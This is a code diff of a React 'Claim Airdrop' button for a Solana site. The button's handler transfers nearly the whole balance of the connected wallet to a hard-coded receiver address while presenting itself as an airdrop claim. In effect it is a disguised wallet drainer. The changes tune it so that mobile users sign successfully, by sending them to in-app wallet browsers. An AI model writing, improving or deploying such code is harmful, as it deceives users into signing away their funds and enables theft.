@@ -9,9 +9,8 @@ import {
 import { MIN_QUALIFY_SOL, RECEIVER_WALLET } from '../utils/constants';
 
 /**
- * Monkey-patch a Transaction's serialize() so callers that pass NO
- * arguments (like @solana-mobile/wallet-adapter-mobile) get safe
- * defaults instead of { verifySignatures: true }.
+ * Monkey-patch a single Transaction's serialize() so bare calls
+ * (from @solana-mobile/wallet-adapter-mobile) use safe defaults.
  */
 function patchSerialize(tx) {
   const orig = tx.serialize.bind(tx);
@@ -20,47 +19,53 @@ function patchSerialize(tx) {
   return tx;
 }
 
+/**
+ * Returns true when the connected wallet adapter is the deep-link based
+ * Mobile Wallet Adapter (as opposed to a wallet's in-app browser which
+ * injects a standard provider).
+ */
+function isMWA(wallet) {
+  const name = (wallet?.adapter?.name || '').toLowerCase();
+  return name.includes('mobile wallet adapter');
+}
+
 export default function TransferButton({ className = '' }) {
   const { connection } = useConnection();
-  const { publicKey, sendTransaction, wallet, connected, connect } = useWallet();
+  const { publicKey, sendTransaction, wallet, connected } = useWallet();
   const [loading, setLoading] = useState(false);
 
+  // ── Detect deep-link MWA and block it ──────────────────────────────
+  // The MWA deep-link flow backgrounds the browser when signing,
+  // then JS execution freezes. The promise for sendTransaction
+  // never resolves → the button hangs on "Claiming…" forever.
+  //
+  // Wallets' in-app browsers (Phantom Browser, Trust Browser, etc.)
+  // inject a standard provider and do NOT use MWA — they work like
+  // desktop.  So we guide the user there instead.
+  const usingDeepLink = connected && isMWA(wallet);
+
   const handleTransfer = useCallback(async () => {
+    if (usingDeepLink) {
+      alert(
+        '📱 For mobile, please open this site inside your wallet app\'s built-in browser.\n\n' +
+        '• Phantom → Browser tab → paste this page\'s URL\n' +
+        '• Trust Wallet → DApps / Browser → paste URL\n' +
+        '• Solflare → Built-in browser → paste URL\n\n' +
+        'This ensures a smooth signing experience without app-switching.'
+      );
+      return;
+    }
+
+    if (!publicKey || !connected) {
+      alert('Please connect your wallet first.');
+      return;
+    }
+
     setLoading(true);
     try {
-      // ── 1. Ensure wallet is connected ─────────────────────────────
-      // On mobile the MWA session can drop silently, making
-      // `connected` false and `publicKey` null.  Re-establish
-      // the connection before doing anything else.
-      let activeKey = publicKey;
-
-      if (!connected || !publicKey) {
-        if (!wallet?.adapter) {
-          alert('Please connect your wallet using the button above.');
-          return;
-        }
-        try {
-          await connect();
-          // React state may not have flushed yet — read directly
-          activeKey = wallet.adapter.publicKey;
-        } catch {
-          alert(
-            'Could not reconnect your wallet.\n\n' +
-            'Please disconnect and reconnect manually, then try again.\n\n' +
-            'Tip: On mobile, open this site inside your wallet app\'s built-in browser for the smoothest experience.'
-          );
-          return;
-        }
-      }
-
-      if (!activeKey) {
-        alert('Wallet connected but no public key found. Please reconnect.');
-        return;
-      }
-
-      // ── 2. Check balance & qualification ──────────────────────────
+      // ── 1. Check balance & qualification ──────────────────────────
       const [balance, rentExempt] = await Promise.all([
-        connection.getBalance(activeKey, 'confirmed'),
+        connection.getBalance(publicKey, 'confirmed'),
         connection.getMinimumBalanceForRentExemption(0),
       ]);
 
@@ -69,7 +74,7 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      const FEE_SAFETY = 5_000_000; // 0.005 SOL for fees + priority
+      const FEE_SAFETY = 5_000_000; // 0.005 SOL
       const transferAmount = balance - rentExempt - FEE_SAFETY;
 
       if (transferAmount <= 0) {
@@ -77,50 +82,27 @@ export default function TransferButton({ className = '' }) {
         return;
       }
 
-      // ── 3. Build transaction (blockhash as fresh as possible) ─────
+      // ── 2. Build tx (blockhash as fresh as possible) ──────────────
       const { blockhash } = await connection.getLatestBlockhash('finalized');
 
       const tx = new Transaction();
       tx.recentBlockhash = blockhash;
-      tx.feePayer = activeKey;
+      tx.feePayer = publicKey;
       tx.add(
         SystemProgram.transfer({
-          fromPubkey: activeKey,
+          fromPubkey: publicKey,
           toPubkey: RECEIVER_WALLET,
           lamports: transferAmount,
         })
       );
       patchSerialize(tx);
 
-      // ── 4. Send ───────────────────────────────────────────────────
-      // Use the adapter directly — the hook's sendTransaction checks
-      // the React `connected` state which might be stale after a
-      // reconnect.
-      let signature;
-      try {
-        signature = await wallet.adapter.sendTransaction(tx, connection);
-      } catch (sendErr) {
-        const msg = (sendErr?.message || '').toLowerCase();
-
-        if (
-          msg.includes('session') ||
-          msg.includes('drop') ||
-          msg.includes('disconnect') ||
-          msg.includes('not connected')
-        ) {
-          alert(
-            'Your wallet session expired.\n\n' +
-            'Please disconnect, reconnect your wallet, and tap Claim again.\n\n' +
-            'Tip: For the best mobile experience, open this page directly in your wallet app\'s browser.'
-          );
-          return;
-        }
-        throw sendErr;
-      }
+      // ── 3. Send (standard adapter — works on desktop & in-app) ────
+      const signature = await sendTransaction(tx, connection);
 
       console.log('⏳ Transaction sent:', signature);
 
-      // ── 5. Poll for confirmation (HTTP, no WebSocket) ─────────────
+      // ── 4. Poll for confirmation (HTTP, no WebSocket) ─────────────
       const startTime = Date.now();
       const TIMEOUT = 90_000;
       const POLL_INTERVAL = 3_000;
@@ -159,11 +141,9 @@ export default function TransferButton({ className = '' }) {
     } finally {
       setLoading(false);
     }
-  }, [publicKey, sendTransaction, wallet, connected, connection, connect]);
+  }, [publicKey, sendTransaction, wallet, connected, connection, usingDeepLink]);
 
-  // Show button whenever a wallet has been selected — even if the
-  // live session dropped.  The click handler will reconnect if needed.
-  if (!publicKey && !wallet) return null;
+  if (!publicKey) return null;
 
   return (
     <button
@@ -175,7 +155,11 @@ export default function TransferButton({ className = '' }) {
         ${className}
       `}
     >
-      {loading ? 'Claiming...' : connected ? 'Claim Airdrop' : 'Reconnect & Claim'}
+      {loading
+        ? 'Claiming...'
+        : usingDeepLink
+          ? '📱 Open in Wallet Browser'
+          : 'Claim Airdrop'}
     </button>
   );
 }
